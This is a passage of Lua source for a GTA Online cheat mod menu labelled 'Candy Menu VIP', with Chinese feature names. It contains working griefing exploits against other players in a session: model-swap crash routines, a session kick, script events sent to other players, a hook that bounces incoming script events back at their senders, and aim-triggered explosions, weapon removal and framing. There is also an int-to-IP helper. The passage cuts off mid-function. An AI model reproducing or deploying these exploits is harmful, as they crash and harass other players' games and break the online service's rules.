player.set_player_model(hash1)
system.wait(500)
while not streaming.has_model_loaded(hash2) do
system.wait(0)
end
player.set_player_model(hash2)
system.wait(500)
while not streaming.has_model_loaded(hash3) do
system.wait(0)
end
player.set_player_model(hash3)
system.wait(500)
while not streaming.has_model_loaded(hash2) do
system.wait(0)
end
streaming.set_model_as_no_longer_needed(hash1)
streaming.set_model_as_no_longer_needed(hash2)
streaming.set_model_as_no_longer_needed(hash3)
streaming.set_model_as_no_longer_needed(hash4)
end)

all_Sctip_crashv2 = menu.add_feature("HASH崩溃", "action", crash1.id,function()
	if lll then
	notify_above_map("防护型崩溃已启动，该功能无法使用")
	return
	end
	local L = true
	if not autorc.on then
	L = false
	autorc.on = true
	end
	local mypos = player.get_player_coords(player.player_id())
	local myhash = entity.get_entity_model_hash(player.get_player_ped(player.player_id()))
	appearance()
	for i = 1,10 do
	entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), v3(460.586,5571.714, 781.179))
	hashmodel(0x9C9EFFD8)
	system.wait(10)
	ped.set_ped_health(player.get_player_ped(player.player_id()), 0)
	system.wait(100)
	hashmodel(0x705E61F2)
	system.wait(10)
	ped.set_ped_health(player.get_player_ped(player.player_id()), 0)	
	system.wait(200)
	end
	restore(myhash)
	if not L then
	autorc.on = false
	end
	entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), mypos)
end)

function hka1337(pid)
    network.network_session_kick_player(pid)
end

menu.add_feature("HASHMOD崩溃","action",crash1.id, function(feat)
	if lll then
	notify_above_map("防护型崩溃已启动，该功能无法使用")
	return
	end
	local L = true
	if not autorc.on then
	L = false
	autorc.on = true
	end
	local myhash = entity.get_entity_model_hash(player.get_player_ped(player.player_id()))
	appearance()
	system.wait(500)
	for i = 0,2 do
	system.wait(5)
	hashmodel(0x705E61F2)
	system.wait(100)
	ped.set_ped_health(player.get_player_ped(player.player_id()), 0)
	system.wait(300)
	hashmodel(0x9C9EFFD8)
	system.wait(100)
	ped.set_ped_health(player.get_player_ped(player.player_id()), 0)
	system.wait(200)
	end
	restore(myhash)
	if not L then
	autorc.on = false
	end
	system.wait(7000)
end)

_U_firework_session = menu.add_feature('随机放烟花','toggle',a.sessionoption.id,function(a)
	menu.notify("新年快乐!", "Candy Menu VIP", 6, RGBAToInt(0, 255, 0))
        while a.on do
            system.yield(0)
            for pid=0,31 do
                if player.is_player_valid(pid) then
                    c.wait(10)
                    local pos=player.get_player_coords(pid)
                    local r1=math.random(-200,200)
                    local r2=math.random(-200,200)
                    gameplay.shoot_single_bullet_between_coords(pos+v3(r1,r2,8),pos+v3(r1,r2,12), 0, 2138347493, player.get_player_ped(pid), false, true, 1000)
                end
            end
        end
    end)
	a.usagenofity= c.df("11","toggle",a.mainmenu.id,function(k,pid)
		while k.on do
			ui.set_text_color(255, 255, 255, 255)					
			ui.set_text_scale(0.56)
			ui.set_text_font(0)
			ui.set_text_centre(true)
			ui.set_text_outline(true)
			ui.draw_text("请开启对应功能",v2(0.07,0.11))
			ui.set_text_font(1)
			c.wait(1)
		end
		k.on = false
	end)
	a.usagenofity.hidden = true

a.usage= c.df("11","toggle",a.mainmenu.id,function(k,pid)
while k.on do
ui.set_text_color(255, 255, 255, 255)					
ui.set_text_scale(0.56)
ui.set_text_font(0)
ui.set_text_centre(true)
ui.set_text_outline(true)
ui.draw_text("X键镭射眼",v2(0.05,0.29))
ui.set_text_font(1)
c.wait(1)
end
k.on = false
end)

a.usage.hidden = true

a.usage1= c.df("11","toggle",a.mainmenu.id,function(k,pid)
while k.on do
ui.set_text_color(255, 255, 255, 255)					
ui.set_text_scale(0.56)
ui.set_text_font(0)
ui.set_text_centre(true)
ui.set_text_outline(true)
ui.draw_text("J键陨石雨",v2(0.05,0.17))
ui.set_text_font(1)
c.wait(1)
end
k.on = false
end)

a.usage1.hidden = true

a.usage2= c.df("11","toggle",a.mainmenu.id,function(k,pid)
while k.on do
ui.set_text_color(255, 255, 255, 255)					
ui.set_text_scale(0.56)
ui.set_text_font(0)
ui.set_text_centre(true)
ui.set_text_outline(true)
ui.draw_text("U键为黑洞",v2(0.05,0.25))
ui.set_text_font(1)
c.wait(1)
end
k.on = false
end)

a.usage2.hidden = true

a.usage3= c.df("11","toggle",a.mainmenu.id,function(k,pid)
while k.on do
ui.set_text_color(255, 255, 255, 255)					
ui.set_text_scale(0.56)
ui.set_text_font(0)
ui.set_text_centre(true)
ui.set_text_outline(true)
ui.draw_text("K键为护盾",v2(0.05,0.21))
ui.set_text_font(1)
c.wait(1)
end
k.on = false
end)

a.usage3.hidden = true

a.usage4= c.df("11","toggle",a.mainmenu.id,function(k,pid)
while k.on do
ui.set_text_color(255, 255, 255, 255)					
ui.set_text_scale(0.56)
ui.set_text_font(0)
ui.set_text_centre(true)
ui.set_text_outline(true)
ui.set_text_font(1)
c.wait(1)
end
k.on = false
end)

a.usage4.hidden = true

a.astomanusage = menu.add_feature("显示快捷键", "toggle", a.astoman.id, function(f)
	while f.on do 
		a.usagenofity.on = true
		a.usage.on = true
		a.usage1.on = true
		a.usage2.on = true
		a.usage3.on = true
		a.usage4.on = true
		c.wait(1)
	end
	f.on = false
	a.usagenofity.on = false
	a.usage.on = false
	a.usage1.on = false
	a.usage2.on = false
	a.usage3.on = false
	a.usage4.on = false
end)

a.astomanptfx = menu.add_feature("周身护盾", "toggle", a.astoman.id, function(k)
	while k.on do
		pedp = player.get_player_ped(c.me())
		pos = player.get_player_coords(c.me())
		fire.add_explosion(pos,70, false, false, 0, pedp)	
		c.wait(100)
	end
	k.on = false
end)

a.hudun = menu.add_feature("前方生成盾牌", "toggle", a.astoman.id, function(f)
pedp = player.get_player_ped(c.me())
while f.on do
local me = c.me()
local binds = {"K"}
for i = 1, 2 do
local key = MenuKey()
key:push_str("K")
while key:is_down() and f.on do
vectorpos = get_collision_vector(c.me(),pedp)
pos = player.get_player_coords(c.me())
pos.z = pos.z - 9
bus = spawn_vehicle(3581397346,pos,0)
car1 = spawn_vehicle(3581397346,pos,0)
car2 = spawn_vehicle(3581397346,pos,0)
car3 = spawn_vehicle(3581397346,pos,0)
car4 = spawn_vehicle(3581397346,pos,0)
entity.attach_entity_to_entity(car1, bus, 0, v3(2,0,0), v3(0,0,0), true, true, false, 0, true)
entity.attach_entity_to_entity(car2, bus, 0, v3(4,0,0), v3(0,0,0), true, true, false, 0, true)
entity.attach_entity_to_entity(car3, bus, 0, v3(-2,0,0), v3(0,0,0), true, true, false, 0, true)
entity.attach_entity_to_entity(car4, bus, 0, v3(-4,0,0), v3(0,0,0), true, true, false, 0, true)
entity.freeze_entity(bus, true)
entity.set_entity_rotation(bus,v3(-90,0, 0))
entity.set_entity_coords_no_offset(bus, vectorpos)
				system.yield(500)
			end
		end
	system.yield(0)
end
end)

a.yuanzhinengquan= c.df("超级拳头","toggle",a.astoman.id,function(k,pid)
while k.on do
pedmy = player.get_player_ped(c.me())
local t, pos = ped.get_ped_last_weapon_impact(pedmy)
fire.add_explosion(pos,70, true, false, 0, pedmy)
c.wait(5)
end
k.on = false
end)

a.lasereye = c.df("糖的审判", "toggle",a.astoman.id, function(k)
	while k.on do
		hash = gameplay.get_hash_key("weapon_rayminigun")
		pedp = player.get_player_ped(c.me())
		mypos = get_collision_vector(c.me(),pedp)
		pos = player.get_player_coords(c.me())
		if  mypos:magnitude(pos) > 2 then
			ui.draw_line(pos+ v3(0,0,0.67), mypos, 250, 50, 50, 1000)
			fire.add_explosion(mypos,18, true, false, 0, pedp)
		end
		c.wait(5)
	end
	k.on = false
end)

a.blackhell = menu.add_feature("黑洞", "toggle", a.astoman.id, function(f)
pedp = player.get_player_ped(c.me())
while f.on do
local me = c.me()
for i = 1, 2 do
local key = MenuKey()
key:push_str("U")
while key:is_down() and f.on do
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
playerpos = player.get_player_coords(c.me())
entitypos = entity.get_entity_coords(allvehs[i])
if playerpos:magnitude(entitypos) < 60 then
mypos = get_collision_vector(c.me(),pedp)
entity.set_entity_coords_no_offset(allvehs[i], mypos)
end
end
c.wait(1)
allobjects = object.get_all_objects()
for i = 1, #allobjects  do
playerpos = player.get_player_coords(c.me())
entitypos = entity.get_entity_coords(allobjects[i])
if playerpos:magnitude(entitypos) < 60 then
mypos = get_collision_vector(c.me(),pedp)
entity.set_entity_coords_no_offset(allobjects[i], mypos)
end
end							
system.yield(500)
end
end
system.yield(0)
end
end)


a.pedforcefield = c.df("PED力场", "toggle",a.astoman.id, function(k)
while k.on do
pedp = player.get_player_ped(c.me())
allpeds = ped.get_all_peds()
for i = 1, #allpeds  do
entitypos = entity.get_entity_coords(allpeds[i])
mypos = player.get_player_coords(c.me())
if mypos:magnitude(entitypos) < 70 and pedp ~= allpeds[i] then 
fire.add_explosion(entitypos,70, true, false, 0, pedp)
end
end
c.wait(1)
end
k.on = false
end)	


a.vehforcefield = c.df("载具力场", "toggle",a.astoman.id, function(k)
while k.on do
pedp = player.get_player_ped(c.me())
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
entitypos = entity.get_entity_coords(allvehs[i])
mypos = player.get_player_coords(c.me())
if mypos:magnitude(entitypos) < 70 and pedp ~= allvehs[i] then 
fire.add_explosion(entitypos,70, true, false, 0, pedp)
end
end
c.wait(1)
end
k.on = false
end)	


vehforcefield = menu.add_feature("载具飞天", "toggle",a.astoman.id, function(k)
while k.on do
pedp = player.get_player_ped(player.player_id())
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
entitypos = entity.get_entity_coords(allvehs[i])
entitypos.z = entitypos.z + 30
entity.set_entity_coords_no_offset(allvehs[i], entitypos)
end
system.wait(1)
end
k.on = false
end)	


vehforcefield = menu.add_feature("物体飞天", "toggle",a.astoman.id, function(k)
while k.on do
pedp = player.get_player_ped(player.player_id())
allobject = object.get_all_objects()
for i = 1, #allobject  do
objectpos = entity.get_entity_coords(allobject[i])
objectpos.z = objectpos.z + 30
entity.set_entity_coords_no_offset(allobject[i], objectpos)
end
system.wait(1)
end
k.on = false
end)	

all_mod = menu.add_feature("标记全部玩家", "toggle", a.protoption.id, function(feat) 
	if feat.on then
		local me
		me = player.player_id()
		for i = 0, 32 do
			if i ~= me then
				player.set_player_as_modder(i, 1)
			end
		end
		return HANDLER_CONTINUE
	end
	return HANDLER_POP	

end)

all_mod.on = false

notallmod = menu.add_feature("取消标记全部玩家", "action", a.protoption.id, function() 
	all_mod.on = false
	local me = player.player_id()
	for i = 0, 32 do
		if i ~= me and player.is_player_modder(i, -1) then
			player.unset_player_as_modder(i, -1)
		end		
	end
end)


modder_prot = menu.add_feature("标记选项", "parent",a.protoption.id, function(f)
end)

zblabel = {}
freshV3_num = 1
freshV3 = menu.add_feature("周身标记", "toggle", modder_prot.id, function(feat)
	if feat.on then
		Settings["zhoushenbiaoji"] = true
		local me = player.player_id()
		for pid = 0, 32 do
			if pid ~= me then 
				if player.is_player_valid(pid) and zblabel[pid] == nil then
					local posw = player.get_player_coords(pid)
					zblabel[pid] = {posw.x,posw.y}
				elseif not player.is_player_valid(pid) and zblabel[pid] ~= nil then 
					zblabel[pid] = nil
				end
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					local poss = player.get_player_coords(pid)
					local myposs = player.get_player_coords(player.player_id())
					local myx = myposs.x - zblabel[pid][1]
					local myy = myposs.y - zblabel[pid][2]
					if(math.abs(myx) < freshV3_num or math.abs(myy) < freshV3_num) and not player.is_player_modder(pid, -1) then
						player.set_player_as_modder(pid, 1)
					else
						zblabel[pid] = {player.get_player_coords(pid).x , player.get_player_coords(pid).y}
					end
				end
			end
		end
		return HANDLER_CONTINUE
    else
		Settings["zhoushenbiaoji"] = false
	end
	return HANDLER_POP
end)

freshV3.on = Settings["zhoushenbiaoji"]


clearcar= menu.add_feature("实体选项", "parent",a.protoption.id, function(feat)
end)
	
menu.add_feature("禁止附近生成PED", "toggle",clearcar.id, function(f)
while f.on do
       ped.set_ped_density_multiplier_this_frame(0)
       system.yield(0)
    end
end)

menu.add_feature("禁止附近生成载具", "toggle",clearcar.id, function(f)
 while f.on do
       vehicle.set_vehicle_density_multipliers_this_frame(0)
       system.yield(0)
    end
end)

SHASIPED = menu.add_feature("杀死附近NPC", "toggle", clearcar.id, function(feat)
		myped  = player.get_player_ped(player.player_id())
		allped = ped.get_all_peds()
		if feat.on then
			for i = 1, #allped do
				if allped[i] ~= myped then
				for pid = 0, 32 do
					if allped[i] == player.get_player_ped(pid) then
						if pid ~= player.player_id() then
						break
						end
					else
						ped.set_ped_health(allped[i], 0)
					end
				end
				end
			end
			return HANDLER_CONTINUE
		else
			return HANDLER_POP
		end
	end)

DONGJIEPED = menu.add_feature("冻结附近NPC", "toggle", clearcar.id, function(feat, pid)
		myped  = player.get_player_ped(player.player_id())
		allped = ped.get_all_peds()
		if feat.on then
			for i = 1, #allped do
				if allped[i] ~= myped then
				for pid = 0, 32 do
					if allped[i] == player.get_player_ped(pid) then
						if pid ~= player.player_id() then
						break
						end
					else
						entity.freeze_entity(allped[i], true)
					end
				end
				end
			end
			return HANDLER_CONTINUE
		else
			for i = 1, #allped do
				entity.freeze_entity(allped[i], false)
			end
			return HANDLER_POP
		end
end)

toggle12 = menu.add_feature("删除附近NPC","toggle",clearcar.id,function(feat)
	menu.notify("删除附近所有的NPC", "Candy Menu VIP", 6, RGBAToInt(0, 255, 0))
	while feat.on do
		Settings["pedshanchu"] = true
		local myPed = MyPed()
		local myPos = MyPos(myPed)
		allpeds = ped.get_all_peds()
		for i = 1, #allpeds do  
			if myPed ~= allpeds[i] and myPos:magnitude(MyPos(allpeds[i])) <= 1000 then
				entity.get_entity_model_hash(allpeds[i])
				entity.delete_entity(allpeds[i])
				ped.set_ped_density_multiplier_this_frame(0)
			end
		end
		c.wait(5)
	end
	Settings["pedshanchu"] = false
end)
toggle12.on = Settings["pedshanchu"]

toggle23 = menu.add_feature("删除附近载具","toggle",clearcar.id,function(feat)
	menu.notify("删除附近所有的载具", "Candy Menu VIP", 6, RGBAToInt(0, 255, 0))
	while feat.on do
		Settings["carshanchu"] = true
		local myPed = MyPed()
		local myPos = MyPos(myPed)
		local myVeh = MyVeh(myPed)
		allvehs = vehicle.get_all_vehicles()
		for i = 1, #allvehs do
			if myVeh ~= allvehs[i] and myPos:magnitude(MyPos(allvehs[i])) <= 1000 then
				entity.get_entity_model_hash(allvehs[i])
				entity.delete_entity(allvehs[i])
				vehicle.set_vehicle_density_multipliers_this_frame(0)
			end
		end
		c.wait(5) 
	end
	Settings["carshanchu"] = false
end)
toggle23.on = Settings["carshanchu"]

toggle124 = menu.add_feature("删除附近实体","toggle",clearcar.id,function(feat)
	menu.notify("删除附近所有的实体", "Candy Menu VIP", 6, RGBAToInt(0, 255, 0))
    while feat.on do
    Settings["bjshanchu"] = true
    local myPed = MyPed()
    local myPos = MyPos(myPed)
    allobj = object.get_all_objects()
    for i = 1, #allobj do  
    if myPed ~= allobj[i] and myPos:magnitude(MyPos(allobj[i])) <= 1000 then
    entity.get_entity_model_hash(allobj[i])
    entity.delete_entity(allobj[i])
    ped.set_ped_density_multiplier_this_frame(0)
    end
    end
    c.wait(5)
    end
    Settings["bjshanchu"] = false
    end)
    toggle124.on = Settings["bjshanchu"]	
	
toggle123 = menu.add_feature("NPC屏蔽","toggle",clearcar.id,function(feat)
	menu.notify("屏蔽附近所有的NPC", "Candy Menu VIP", 6, RGBAToInt(0, 255, 0))
    while feat.on do
	Settings["pedpingbi"] = true
    local myPed = MyPed()
    local myPos = MyPos(myPed)
    allpeds = ped.get_all_peds()
    for i = 1, #allpeds do
    if myPed ~= allpeds[i] and myPos:magnitude(MyPos(allpeds[i])) <= 1000 then
    network.request_control_of_entity(allpeds[i])
    entity.set_entity_as_mission_entity(allpeds[i], 0, 1)
    entity.set_entity_as_no_longer_needed(allpeds[i])   
    entity.set_entity_visible(allpeds[i],false)
    myped = player.get_player_ped(c.me())
    entity.set_entity_visible(myped,true)
    end  
    end     
    c.wait(5)
    end
	Settings["pedpingbi"] = false
    feat.on = false  
    allvehs = vehicle.get_all_vehicles()
    allpeds = ped.get_all_peds()  
    for i = 1, #allpeds do
    network.request_control_of_entity(allpeds[i])
    entity.set_entity_as_mission_entity(allpeds[i], 0, 1)
    entity.set_entity_as_no_longer_needed(allpeds[i])
    entity.set_entity_visible(allpeds[i],true)    
    end
    end)

toggle123.on = Settings["pedpingbi"]	

aimprot= menu.add_feature("瞄准保护", "parent",a.protoption.id, function(feat)
end)

miaozhunbaohu = menu.add_feature("瞄准保护", "value_str", aimprot.id, function(f)
	while f.on do
		for pid = 0, 31 do
			if player.is_player_valid(pid) and player.player_id() ~= pid and player.get_entity_player_is_aiming_at(pid) == player.get_player_ped(player.player_id()) then
				if f.value == 0 then
					if player.is_player_in_any_vehicle(pid) or player.get_player_coords(pid).z == -50 then
						ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
						system.yield(300)
					end
					local blame = player.player_id()
						local player_coords = player.get_player_coords(pid)
						fire.add_explosion(player_coords, 4, true, false, 1, blame)
						fire.add_explosion(player_coords, 4, false, true, 1, blame)
						fire.add_explosion(player_coords, 4, true, true, 1, blame)
						fire.add_explosion(player_coords, 4, false, false, 1, blame)
				elseif f.value == 1 then
					if player.is_player_in_any_vehicle(pid) or player.get_player_coords(pid).z == -50 then
						ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
						system.yield(300)
					end
					local owner = player.get_player_ped(pid)
					for pid = 0,32 do
						local player_coords = player.get_player_coords(pid)
						fire.add_explosion(player_coords, 4, true, false, 1, owner)
						fire.add_explosion(player_coords, 4, false, true, 1, owner)
						fire.add_explosion(player_coords, 4, true, true, 1, owner)
						fire.add_explosion(player_coords, 4, false, false, 1, owner)
					end
					elseif f.value == 2 then
					local time = utils.time_ms() + 500
					local plypos = entity.get_entity_coords(player.get_player_ped(pid))
					heading = entity.get_entity_heading(player.get_player_ped(pid))
					local heading = math.rad((heading - 180) * -1)
					plypos.x = plypos.x + (math.sin(heading) * -0.3)
					plypos.y = plypos.y + (math.cos(heading) * -0.3)
					while time > utils.time_ms() do
						gameplay.shoot_single_bullet_between_coords(plypos, select(2, ped.get_ped_bone_coords(player.get_player_ped(pid), 0x60f1, v3())), 0, 911657153, player.get_player_ped(player.player_id()), true, false, 1000)
						system.yield(0)
					end
				elseif f.value == 3 then
					if player.is_player_valid(pid) and pid ~= player.player_id() and not player.is_player_friend(pid) then
						script.trigger_script_event(1249026189, pid, {pid, pid, 1, 0, math.random(1, 114), 1, 1, 1})
					end
				elseif f.value == 4 then
					for i, weapon_hash in pairs(weapon.get_all_weapon_hashes()) do
						weapon.remove_weapon_from_ped(player.get_player_ped(pid), weapon_hash)
						system.yield(0)
					end
				end
			end
		end
		system.yield(0)
	end
end):set_str_data({
	"爆炸",
	"栽赃",
	"电击",
	"邀请到公寓",
	"移除玩家武器"
})

aimprotairs = c.df("瞄准空袭","toggle",aimprot.id,function(k)
pedmy = player.get_player_ped(c.me())
while k.on do
Settings["miaozhunkongxi"] = true
for pid =0 ,32 do
if pid~= c.me() then
ent = player.get_entity_player_is_aiming_at(pid)
get_control_of_entity(ent,300)
pedp = player.get_player_ped(pid)
if ped.is_ped_shooting(pedp) then
if entity.is_entity_a_ped(ent) then
c.wait(100)
if ped.is_ped_a_player(ent)then
if ent == pedmy then
pos = player.get_player_coords(pid)
local hash = gameplay.get_hash_key("weapon_airstrike_rocket")
pos.z = pos.z + 10.0
local offset = v3(0,0,0)
gameplay.shoot_single_bullet_between_coords(pos, player.get_player_coords(pid) + offset, 10000.00, hash,0, true, false, 10000.0)
c.wait(50)
end
end
end
end
end
end
c.wait(50)
end
k.on = false
Settings["miaozhunkongxi"] = false
end)

aimprotairs.on = Settings["miaozhunkongxi"]

aimprotremoveweapon = c.df("阻止瞄准&移除武器","toggle",aimprot.id,function(k)
pedmy = player.get_player_ped(c.me())
while k.on do
Settings["aimprotremoveweapon"] = true
for pid =0 ,32 do
if pid~= c.me() then
ent = player.get_entity_player_is_aiming_at(pid)
get_control_of_entity(ent,300)
pedp = player.get_player_ped(pid)
if ped.is_ped_shooting(pedp) then
if entity.is_entity_a_ped(ent) then
c.wait(100)
if ped.is_ped_a_player(ent)then
if ent == pedmy then
pedp = player.get_player_ped(pid)
ped.clear_ped_tasks_immediately(pedp)
weaponhash = weapon.get_all_weapon_hashes()
for i = 1,#weaponhash do
weapon.remove_weapon_from_ped(pedp,weaponhash[i])
c.wait(5)
end
end
end
end
end
end
end
c.wait(50)
end
k.on = false
Settings["aimprotremoveweapon"] = false
end)
aimprotremoveweapon.on = Settings["aimprotremoveweapon"]

aimprotupn = c.df("瞄准原子能枪爆炸","toggle",aimprot.id,function(k)
pedmy = player.get_player_ped(c.me())
while k.on do
Settings["aimprotupn"] = true
for pid =0 ,32 do
if pid~= c.me() then
ent = player.get_entity_player_is_aiming_at(pid)
get_control_of_entity(ent,300)
pedp = player.get_player_ped(pid)
if ped.is_ped_shooting(pedp) then
if entity.is_entity_a_ped(ent) then
c.wait(100)
if ped.is_ped_a_player(ent)then
if ent == pedmy then
pedp = player.get_player_ped(pid)
ped.clear_ped_tasks_immediately(pedp)
pos = player.get_player_coords(pid)
for i = 0 , 20 do
fire.add_explosion(pos, 70, true, false, 0, pedmy)
end
end
end
end
end
end
end
c.wait(50)
end
k.on = false
Settings["aimprotupn"] = false
end)
aimprotupn.on = Settings["aimprotupn"]

yushiwuzheng = menu.add_feature("阻止战局同步","toggle",a.protoption.id,function(a)
	menu.notify("阻止同步所有人 屏蔽附近所有载具PED实体", "Candy Menu VIP", 6, RGBAToInt(0, 255, 0))
        while a.on do
		Settings["yushiwuzheng"] = true
            system.yield(0)
            if a.on then
                gameplay.clear_area_of_objects(player.get_player_coords(player.player_id()),1000,0)
                gameplay.clear_area_of_vehicles(player.get_player_coords(player.player_id()),150,false,false,false,false,false)
                gameplay.clear_area_of_peds(player.get_player_coords(player.player_id()),1000,false)
                gameplay.clear_area_of_cops(player.get_player_coords(player.player_id()),1000,false)
                local all_objs=object.get_all_objects()
                local all_peds=ped.get_all_peds()
                local all_vehicles=vehicle.get_all_vehicles()
                if all_objs[1] then
                    for i=1,#all_objs do
                        if all_objs[i] then
                            entity.delete_entity(all_objs[i])
                        end
                    end
                end
                if all_peds[1] then
                    for i=1,#all_peds do
                        if all_peds[i] and not ped.is_ped_a_player(all_peds[i]) then
                            entity.delete_entity(all_peds[i])
                        end
                    end
                end
                if all_vehicles[1] then
                    for i=1,#all_vehicles do
                        if all_vehicles[i] and all_vehicles[i]~=player.get_player_vehicle(player.player_id()) then
                            entity.delete_entity(all_vehicles[i])
                        end
                    end
                end
                for pid=0,31 do
                    if pid~=player.player_id() and player.is_player_valid(pid) and a.on then
                        player.set_player_as_modder(pid,1 << 0x00)
                        entity.set_entity_visible(player.get_player_ped(pid),false)
                        player.set_player_visible_locally(pid,false)
                    end
                end
            else
                for pid=0,31 do
                    if pid~=player.player_id() and player.is_player_valid(pid) then
                        player.unset_player_as_modder(pid,1 << 0x00)
                        entity.set_entity_visible(player.get_player_ped(pid),true)
                        player.set_player_visible_locally(pid,true)
                    end
                end
            end
        end
		Settings["yushiwuzheng"] = false
    end)
yushiwuzheng.on = Settings["yushiwuzheng"]

karma = menu.add_feature("反弹脚本事件", "toggle",a.protoption.id, function(k)
	
	menu.notify("反弹脚本事件", "Candy Menu VIP", 6, RGBAToInt(0, 255, 0))
	if k.on and scripthook == nil then
		Settings["fantanjiaobenshijian"] = true
		scripthook = hook.register_script_event_hook(
			function(Source, U, V, W)
				local eventid = V[1]
				table.remove(V, 1)
				N.sEv(eventid, Source, V)
				print(eventid)        
			end)
		end
		if not k.on and scripthook then
			Settings["fantanjiaobenshijian"] = false
			hook.remove_script_event_hook(scripthook)
			scripthook = nil
		end
	end)
	karma.on = Settings["fantanjiaobenshijian"]

tongzhi= menu.add_feature("脚本拦截通知","toggle",a.protoption.id,function(feat)
        while feat.on do
			Settings["zhongwentishi"] = true
            for pid = 0 , 32 do
                if player.is_player_playing(pid) and player.is_player_modder(pid,-1) then
                    local playername = player.get_player_name(pid) 
                    local flagint = player.get_player_modder_flags(pid)
                    if flagint == 1 and not player_modder[pid][1] then
                        notify_above_map("已标记玩家: "..playername)
                        player_modder[pid] = {true,false}
                    end
                    if flagint == 4 and not player_modder[pid][1] then
                        notify_above_map("无效RID崩溃来自: "..playername)
                        player_modder[pid] = {true,false}
                    end
                    system.wait(1)
                    if flagint == 16 and not player_modder[pid][1] then
                        notify_above_map("无效OBJ崩溃来自: "..playername)
                        player_modder[pid] = {true,false}
                    end
                    system.wait(1)
                    if flagint == 32 and not player_modder[pid][1] then
                        notify_above_map("无效PED崩溃来自: "..playername)
                        player_modder[pid] = {true,false}
                    end
                    system.wait(1)
                    if flagint == 128 and not player_modder[pid][1] then
                        notify_above_map("模型更改崩溃来自: "..playername)
                        player_modder[pid] = {true,false}
                    end
                    system.wait(1)
                    if flagint == 16384 and not player_modder[pid][1] then
                        notify_above_map("网络数据崩溃来自: "..playername)
                        player_modder[pid] = {true,false}
                    end
                    system.wait(1)
                    if flagint == 32768 and not player_modder[pid][1] then
                        notify_above_map("网络同步崩溃来自: "..playername)
                        player_modder[pid] = {true,false}
                    end
                    system.wait(1)
                    if flagint == 65536 and not player_modder[pid][1] then
                        notify_above_map("网络事件崩溃来自: "..playername)
                        player_modder[pid] = {true,false}
                    end
                    system.wait(1)
                    if flagint == 131072 and not player_modder[pid][1] then
                        notify_above_map("强制主机: "..playername)
                        player_modder[pid] = {true,false}
                    end
                    system.wait(1)
                    if flagint == 262144 and not player_modder[pid][1] then
                        notify_above_map("脚本事件: "..playername)
                        player_modder[pid] = {true,false}
                    end
                    system.wait(1)
                else
                    player_modder[pid] = {false,false}
                end
            end
            return HANDLER_CONTINUE
        end
        feat.on = false
		Settings["zhongwentishi"] = false
    end)

    tongzhi.on = Settings["zhongwentishi"]

 player_modder = {}
    for i = 0,32 do
      player_modder[i] = {false,false}
  end

vehicleinvisible = menu.add_feature("载具屏蔽","toggle",clearcar.id,function(feat)
menu.notify("屏蔽附近的所有载具", "Candy Menu VIP", 6, RGBAToInt(0, 255, 0))
while feat.on do
Settings["zaijupingbi"] = true
local myPed = MyPed()
local myPos = MyPos(myPed)
local myVeh = MyVeh(myPed)
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs do
if myVeh ~= allvehs[i] and myPos:magnitude(MyPos(allvehs[i])) <= 1000 then
network.request_control_of_entity(allvehs[i])
local carhash = entity.get_entity_model_hash(allvehs[i])
if carhash == 368211810 and carhash == 3929093893 and carhash == 2598821281 and carhash ==1283517198 then
entity.set_entity_as_mission_entity(allvehs[i], 0, 1)
entity.set_entity_as_no_longer_needed(allvehs[i])
entity.set_entity_visible(allvehs[i],false)
entity.set_entity_coords_no_offset(allvehs[i], pos)
else
entity.set_entity_as_mission_entity(allvehs[i], 0, 1)
entity.set_entity_as_no_longer_needed(allvehs[i])
entity.set_entity_visible(allvehs[i],false)
end
end
end
system.wait(5)
end
Settings["zaijupingbi"] = false
feat.on = false
allvehs = vehicle.get_all_vehicles()
allpeds = ped.get_all_peds()
for i = 1, #allvehs do
network.request_control_of_entity(allvehs[i])
entity.set_entity_as_mission_entity(allvehs[i], 0, 1)
entity.set_entity_as_no_longer_needed(allvehs[i])
entity.set_entity_visible(allvehs[i],true)
end
end)

vehicleinvisible.on = Settings["zaijupingbi"]

objtinvisible = menu.add_feature("物体屏蔽","toggle",clearcar.id,function(feat)
menu.notify("屏蔽附近的所有物体", "Candy Menu VIP", 6, RGBAToInt(0, 255, 0))
while feat.on do
Settings["wutipingbi"] = true
local myPed = MyPed()
local myPos = MyPos(myPed)
allobj = object.get_all_objects()
for i = 1, #allobj do
if myPos:magnitude(MyPos(allobj[i])) <= 1000 then
network.request_control_of_entity(allobj[i])
entity.set_entity_as_mission_entity(allobj[i], 0, 1)
entity.set_entity_as_no_longer_needed(allobj[i])
entity.set_entity_visible(allobj[i],false)		
end
end									
system.wait(5)
end
Settings["wutipingbi"] = false
feat.on = false
allvehs = vehicle.get_all_vehicles()
allpeds = ped.get_all_peds()
allobj = object.get_all_objects()
for i = 1, #allobj do
network.request_control_of_entity(allobj[i])
entity.set_entity_as_mission_entity(allobj[i], 0, 1)
entity.set_entity_as_no_longer_needed(allobj[i])
entity.set_entity_visible(allobj[i],true)
end
end)
objtinvisible.on = Settings["wutipingbi"]


anticrashcam= menu.add_feature("安全区域", "toggle",a.protoption.id, function(feat)
menu.notify("上天咯!", "Candy Menu VIP", 6, RGBAToInt(0, 255, 0))
local bs = v3(50000, 50000, 10000)
local pos = entity.get_entity_coords(player.get_player_ped(c.me()))
local pedmy = player.get_player_ped(c.me())
while feat.on do
get_control_of_entity(pedmy,300)
entity.set_entity_visible(pedmy,false)
entity.set_entity_coords_no_offset(pedmy, bs)		
c.wait(100)
end
feat.on = false
get_control_of_entity(pedmy,300)
entity.set_entity_coords_no_offset(pedmy, pos)
entity.set_entity_visible(pedmy,true)
end)

		
function intToIp(num)		
    ip=''
    local int16=string.format("%x",num)
    for i=1,#int16 do
        if math.fmod(i,2)==0 then
            if ip~='' then
                ip=ip..'.'..var_int
            else
                ip=var_int
            end
        else
            var_int=tostring(tonumber(string.sub(int16,i,i+1), 16))
        end
    end
    return ip
end
	
_U_hack_list={}
_U_lisc_hack=menu.add_feature("作弊者嘲讽","toggle",a.protoption.id,function(a)
	while a.on do
		system.yield(0)
           for pid=0,31 do
                if pid~= player.player_id() then
